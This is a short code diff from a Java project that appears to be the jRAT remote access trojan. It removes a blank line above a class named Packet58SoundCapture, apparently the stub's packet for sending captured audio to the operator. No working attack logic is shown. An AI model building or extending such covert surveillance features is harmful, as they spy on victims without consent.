@@ -5,7 +5,6 @@ import java.io.DataOutputStream;
 import pro.jrat.common.io.StringWriter;
 import pro.jrat.stub.Connection;
 
-
 public class Packet58SoundCapture extends AbstractOutgoingPacket {
 
 	@Override
